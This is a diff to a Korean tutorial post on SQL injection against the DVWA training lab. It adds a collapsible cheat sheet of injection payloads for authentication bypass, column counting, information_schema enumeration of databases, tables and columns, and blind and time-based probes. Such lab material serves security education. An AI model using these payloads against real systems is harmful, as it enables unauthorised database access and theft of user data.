@@ -180,6 +180,46 @@ user_id, first name, surname, passwd 를 보여준다.
 
 <br><br>
 
+이 밖에도 다양한 명령어들로 공격을 할 수 있다. 명령어들을 정리해두었다.
+
+<details markdown="1">
+<summary>명령어 정리🔎</summary>
+
+~~~sql 
+// WHERE 구문 우회
+1' or '1'='1
+
+// UNION을 이용한 칼럼 갯수 알아내기
+1' union select 1,1#
+
+// ORDER BY 구문을 이용한 칼럼 갯수 알아내기
+1' order by 2#
+
+// 데이터베이스 명 조회
+1' union select schema_name,1 from information_schema.schemata #
+
+// dvwa 데이터베이스의 테이블 명 조회
+1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #
+
+// users 테이블 칼럼 조회
+1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'# 
+
+// 블라인드 SQL 인젝션 참 구문
+1' AND 1=1# 
+
+// 블라인드 SQL 인젝션 거짓 구문
+1' AND 1=2#
+
+// 시간기반 블라인드 SQL 인젝션 탐지 구문
+1' AND SLEEP(5)#
+~~~
+
+</details>
+
+<br><br>
+
+
+
 ### (2) 블라인드 SQL 인젝션
 
 
